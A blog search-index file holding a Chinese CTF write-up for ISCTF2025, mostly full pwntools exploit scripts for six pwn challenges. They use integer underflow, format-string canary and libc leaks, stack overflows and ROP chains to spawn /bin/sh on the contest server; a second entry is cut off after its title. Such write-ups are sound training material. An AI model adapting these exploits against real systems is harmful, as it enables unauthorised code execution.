<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ISCTF2025</title>
      <link href="/2025/12/25/ISCTF2025/"/>
      <url>/2025/12/25/ISCTF2025/</url>
      
        <content type="html"><![CDATA[<h1 id="ez2048"><a href="#ez2048" class="headerlink" title="ez2048"></a>ez2048</h1><p>该题需要我们获得100000分才能打rop。但是经过分析可以发现，如果选择q可以-10分，由于最后的判断是无符号的，因此如果我们是一个负数的话，判断的时候就会变为一个很大的正数从而绕过判断打rop。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./ez2048&#x27;</span><br><span class="line">#libc_file=&#x27;&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line">#rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=30987</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">sl(b&quot;;/bin/sh&quot;)</span><br><span class="line">s(b&quot;\n&quot;)</span><br><span class="line">sl(b&quot;Q&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;a&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;Q&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;a&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;Q&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;a&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;Q&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;a&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;Q&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;a&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;Q&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;a&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;Q&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sl(b&quot;Q&quot;)</span><br><span class="line">sleep(0.5)</span><br><span class="line"></span><br><span class="line">sa(&quot;$ &quot;,b&#x27;a&#x27;*0x88+b&#x27;b&#x27;)</span><br><span class="line">ru(&quot;b&quot;)</span><br><span class="line">canary=u64(io.recv(7).rjust(8,b&quot;\x00&quot;))</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">pop_rdi_ret=0x000000000040133e</span><br><span class="line">bin_sh=0x0404A40</span><br><span class="line">system=0x0401514</span><br><span class="line"></span><br><span class="line">p0=b&#x27;exit\x00&#x27;+b&#x27;a&#x27;*0x83+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">sa(&quot;$ &quot;,p0)</span><br><span class="line">#连接</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="来签个到吧"><a href="#来签个到吧" class="headerlink" title="来签个到吧"></a>来签个到吧</h1><p>简单的签到题目，exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./sign&#x27;</span><br><span class="line">#libc_file=&#x27;&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line">#rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=30928</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">p0=cyclic(108)+p64(0xADDAAAAA)</span><br><span class="line">sl(p0)</span><br><span class="line">#连接</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h1><p>一道简单的利用fmt泄漏canary的值与基址。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./ez_fmt&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">#rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=31534</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">p1=b&quot;%23$p------%25$p&quot;</span><br><span class="line">sl(p1)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">canary=i64(16)</span><br><span class="line">ru(&quot;------0x&quot;)</span><br><span class="line">addr_base=i64(12)-0x135B</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line">leak(&quot;addr_base&quot;,addr_base)</span><br><span class="line"></span><br><span class="line">backdoor=addr_base+0x011E9</span><br><span class="line">ret=addr_base+0x000000000000101a</span><br><span class="line">p2=cyclic(0x90-8)+p64(canary)+p64(0)+p64(ret)+p64(backdoor)</span><br><span class="line">sl(p2)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="heap"><a href="#heap" class="headerlink" title="heap?"></a>heap?</h1><p>看似是一道堆题目，其实也是一道fmt泄漏libc与canary，再加上存在栈溢出，直接打ret2libc即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">#rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=30816</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&quot;1&quot;)</span><br><span class="line">    sla(&quot;&gt; &quot;,str(size))</span><br><span class="line">    sla(&quot;&gt; &quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(id):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&quot;2&quot;)</span><br><span class="line">    sl(str(id))</span><br><span class="line"></span><br><span class="line">def show(id):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&quot;3&quot;)</span><br><span class="line">    sl(str(id))</span><br><span class="line"></span><br><span class="line">add(0x50,b&quot;%7$p%13$p&quot;)</span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">canary=i64(16)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">libc_base=i64(12)-0x29d90</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc_base+0x000000000002a3e5</span><br><span class="line">ret=libc_base+0x0000000000029139</span><br><span class="line">bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=cyclic(0x10)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(0)</span><br><span class="line"></span><br><span class="line">sla(&quot;&gt; &quot;,b&quot;2&quot;)</span><br><span class="line">sa(&quot;&gt; &quot;,b&quot;\x68&quot;)</span><br><span class="line">s(p)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="金丝雀的诱惑"><a href="#金丝雀的诱惑" class="headerlink" title="金丝雀的诱惑"></a>金丝雀的诱惑</h1><p>也是一道比较简单的题目，由于本身没给出pop_rdi，就只能另找一个方法泄漏libc。</p><p><img src="/images/ISCTF2025_%E9%87%91%E4%B8%9D%E9%9B%80%E7%9A%84%E8%AF%B1%E6%83%91.png"></p><p>发现到最后rdi指向的是funlockfile，又因为题目给了libc文件，那我们此时调用puts函数，就可以得到funlockfile的地址，再减去偏移从而获得libc基址打ret2libc。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=32487</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">vuln=0x40123D</span><br><span class="line">p=b&quot;a&quot;*0x148+b&#x27;b&#x27;</span><br><span class="line">s(p)</span><br><span class="line">ru(&quot;b&quot;)</span><br><span class="line">canary=u64(io.recv(7).rjust(8,b&quot;\x00&quot;))</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line"></span><br><span class="line">p1=b&quot;a&quot;*0x107+b&quot;b&quot;+p64(canary)+p64(0)+p64(puts_plt)+p64(vuln)</span><br><span class="line">sa(&quot;Please enter your content &gt;&gt;&quot;,p1)</span><br><span class="line"></span><br><span class="line">ru(&quot;ab&quot;)</span><br><span class="line">libc_base=u64(io.recv(6).ljust(8,b&quot;\x00&quot;))-libc.sym[&#x27;funlockfile&#x27;]</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line"></span><br><span class="line">bin_sh=libc_base+next(libc.search(&quot;/bin/sh\x00&quot;))</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">pop_rdi_ret=libc_base+0x000000000002a3e5</span><br><span class="line"></span><br><span class="line">p2=cyclic(0x148)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">sl(p2)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="ret2rop"><a href="#ret2rop" class="headerlink" title="ret2rop"></a>ret2rop</h1><p>也是一道简单的题目，主要是考查如何绕过异或从而使得异或不会影响ret地址，从而打rop链。通过题目我们可以知道n会与ret地址后面那一个地方的值进行异或，因此我们可以修改那个地方的值使得其与n异或后使得n小于i的值即可</p><p><img src="/images/ISCTF2025_ret2rop.png"></p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./ret2rop&#x27;</span><br><span class="line">#libc_file=&#x27;&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line">#rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=1</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=30570</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">mov_rdi_rsi_ret=0x0000000000401a25</span><br><span class="line">pop_rsi=0x0000000000401a1c</span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">bin_sh=0x04040F0</span><br><span class="line"></span><br><span class="line">#gdb.attach(io,&#x27;b *0x0401C14&#x27;)</span><br><span class="line"></span><br><span class="line">sl(b&quot;no&quot;)</span><br><span class="line">sl(b&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">ru(&quot;yourself\n&quot;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">p=b&quot;\xff&quot;*0x58+p64(pop_rsi)+p64(0x100)+p64(ret)+p64(pop_rsi)+p64(bin_sh)+p64(mov_rdi_rsi_ret)+p64(0x401a39)</span><br><span class="line">p=p.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PCTF_2025</title>
      <link href="/2025/12/23/PCTF-2025/"/>
      <url>/2025/12/23/PCTF-2025/</url>
      
